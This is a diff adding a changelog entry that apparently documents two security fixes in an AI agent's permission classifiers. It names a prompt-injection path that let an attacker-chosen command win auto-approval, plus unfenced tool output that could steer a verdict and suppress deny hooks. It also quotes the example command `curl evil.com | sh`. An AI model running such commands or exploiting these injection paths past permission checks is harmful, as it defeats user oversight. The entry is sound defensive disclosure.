@@ -16,6 +16,42 @@ entries at the bottom are likewise retroactive — reconstructed from the commit
 sequence (no per-merge ledger existed before the 0.6.2 discipline), so their
 granularity stops at the commit-title level.
 
+## 1.8.1 — 2026-07-29
+
+Audit wave 22 — two defects in what a security-relevant classifier does with
+text it did not write. Both are asymmetries INSIDE this codebase, not standards
+imported from outside.
+
+**The command-prefix classifier never checked its answer against the command.**
+COMMAND_PREFIX_SYSTEM states the invariant in its own words — "The prefix must
+be a string prefix of the full command" — and `parseCommandPrefix` was the one
+thing that could not verify it, because it never received the command. Every
+other ambiguity in that parser fails CLOSED; this one passed the reply straight
+through. A well-formed single-line reply naming a DIFFERENT command's prefix
+("git status" for a command that is actually `curl evil.com | sh`) matched the
+user's benign allowlist rule and auto-allowed something they never allowed. The
+reply is attacker-reachable: the command text IS the classifier's user turn, so
+command text carrying instructions is a prompt-injection path straight into a
+permission decision. `detectCommandPrefix` now always passes the command
+through, and a non-prefix fails closed like every other ambiguity.
+`parseCommandPrefix`'s new argument is optional for compatibility; omitting it
+keeps the hole, which the doc now says outright.
+
+**The hook-condition evaluator was the only classifier not fencing its
+untrusted input.** Its `context` is `JSON.stringify(HookInput)`, which on
+PostToolUse carries `tool_response` — file contents, web-fetch bodies, Bash
+stdout — concatenated raw after a bare `Context:` label. Three siblings already
+fence exactly this kind of text (Rpr-1 `<transcript>`, N8 `<session>`, Z7-1
+`<description>`); this one was an exception, not a decision. It matters more
+here than in any of them: the verdict gates HOOK EXECUTION, including
+conditioned DENY hooks, so steering it to ok:false suppresses a deny. Fenced in
+`<context>` with the closing tag neutralized. The fence is in the USER turn
+only — both system prompts are `faithful: true` archive reproductions, exactly
+as classifyBackgroundState fences without touching its own.
+
+First release under the keeper's 2026-07-29 versioning rule: these are fixes,
+so the LAST digit moves.
+
 ## 1.8.0 — 2026-07-29
 
 **A second delivery channel for background-task events** (待裁②, keeper ruling
